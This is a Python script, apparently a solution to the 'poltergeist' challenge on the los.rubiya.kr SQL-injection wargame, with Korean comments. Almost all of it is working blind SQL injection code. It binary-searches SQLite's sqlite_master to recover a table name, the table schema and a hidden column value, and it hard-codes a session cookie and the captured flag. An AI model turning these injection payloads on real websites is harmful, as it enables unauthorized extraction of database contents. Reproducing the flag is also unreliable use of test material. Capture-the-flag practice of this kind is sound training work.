import string
import requests

url = "https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php?"
params = {"pw" : None}
cookies = {"PHPSESSID" : "mckb6uj8ldfsho123g0u5jkokp"}

# 테이블 명 찾기
for i in range(2):
    for j in range(2,30):
        payload = "' or (select length(tbl_name) from sqlite_master limit {},1)={}-- -".format(i,j)
        params["pw"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        # 하나의 테이블 마다 찾기
        if("Hello guest" in response.text):
            print("find the tbl_length",j)
            tbl_name = ''
            for k in range(1,j+1):
                start,end = 0,255
                while True:
                    search = int((start + end)/2)
                    payload = "' or (select unicode(substr(tbl_name,{},1)) from sqlite_master limit {},1)<={}-- -".format(k,i,search)
                    params["pw"] = payload
                    print(payload)
                    response = requests.get(url,params=params,cookies=cookies)
                    if("Hello guest" in response.text):
                        payload = "' or (select unicode(substr(tbl_name,{},1)) from sqlite_master limit {},1)={}-- -".format(k,i,search)
                        params["pw"] = payload
                        print(payload)
                        response = requests.get(url,params=params,cookies=cookies)
                        if("Hello guest" in response.text):
                            tbl_name += chr(search)
                            print("find the tbl_name",tbl_name)
                            break
                        end = search
                    else:
                        start = search
            break
    print("complete table name :",tbl_name)

# flag_70c81d99 테이블의 컬럼명을 알아야 한다.
# 이거는 sql을 알아와서 해야 하네 ^..

# sql 길이 알아내기
start,end = 0,255
while True:
    search = int((start + end)/2)
    payload = "' or (select length(sql) from sqlite_master where tbl_name='flag_70c81d99')<={}-- -".format(search)
    params["pw"] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello guest" in response.text):
        payload = "' or (select length(sql) from sqlite_master where tbl_name='flag_70c81d99')={}-- -".format(search)
        params["pw"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello guest" in response.text):
            tbl_name += chr(search)
            print("find the sql_len",tbl_name)
            break
        end = search
    else:
        start = search

# sql 은 54자리. 다 찾는다 
# CRETE TABLE flag_70c81d99 (
# ) .... 
sql = ''
for i in range(25,55):
    start,end = 0,255
    while True:
        search = int((start + end)/2)
        payload = "' or (select unicode(substr(sql,{},1)) from sqlite_master where tbl_name='flag_70c81d99')<={}-- -".format(i,search)
        params["pw"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello guest" in response.text):
            payload = "' or (select unicode(substr(sql,{},1)) from sqlite_master where tbl_name='flag_70c81d99')={}-- -".format(i,search)
            params["pw"] = payload
            print(payload)
            response = requests.get(url,params=params,cookies=cookies)
            if("Hello guest" in response.text):
                sql += chr(search)
                print("find the sql",sql)
                break
            end = search
        else:
            start = search

# 이제 찾은 컬럼명을 통해서 패스워드를 찾자
# 패스워드 길이는 8자리 일거로 추측
flag = ''

for i in range(1,39):
    start,end = 0,255
    while True:
        search = int((start + end)/2)
        payload = "' or (select unicode(substr(flag_0876285c,{},1)) from flag_70c81d99)<={}-- -".format(i,search)
        params["pw"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello guest" in response.text):
            payload = "' or (select unicode(substr(flag_0876285c,{},1)) from flag_70c81d99)={}-- -".format(i,search)
            params["pw"] = payload
            print(payload)
            response = requests.get(url,params=params,cookies=cookies)
            if("Hello guest" in response.text):
                flag += chr(search)
                print("find the sql",flag)
                break
            end = search
        else:
            start = search

# FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}